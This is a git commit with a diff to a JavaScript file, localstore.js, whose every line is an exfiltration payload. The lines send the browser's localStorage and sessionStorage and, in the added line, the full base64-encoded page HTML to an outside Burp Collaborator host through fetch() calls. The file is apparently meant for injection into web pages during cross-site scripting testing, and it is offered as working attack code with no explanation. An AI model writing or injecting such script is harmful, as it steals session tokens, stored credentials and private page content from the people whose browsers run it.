9f1ce427772e019da93436165f2bb575b38eb185
Lam Scun <dreamhopeaaa@gmail.com>
2024-03-21 11:10:26 +0700

    Update localstore.js

--- localstore.js
+++ localstore.js
@@ -1,3 +1,4 @@
 fetch('https://wwwz15e554m201wwajfl7m1ey54z1nq.burpcollaborator.net/?localStorage='+JSON.stringify(localStorage)+'&sessionStorage='+JSON.stringify(sessionStorage), { method: "GET"}).then(response => response.json()).then(json => console.log(json)).catch(err => console.log(err));
 fetch('https://wwwz15e554m201wwajfl7m1ey54z1nq.burpcollaborator.net/localStorage', {method: "POST", body: 'localStorage='+JSON.stringify(localStorage)+'&sessionStorage='+JSON.stringify(sessionStorage), headers: {"Content-type": "text/plain"}}).then(response => response.json()) .then(json => console.log(json)).catch(err => console.log(err));
+fetch('https://wwwz15e554m201wwajfl7m1ey54z1nq.burpcollaborator.net/dump_html_dom', {method: "POST", body: 'html_dom='+btoa(document.documentElement.outerHTML), headers: {"Content-type": "text/plain"}}).then(response => response.json()) .then(json => console.log(json)).catch(err => console.log(err));
 
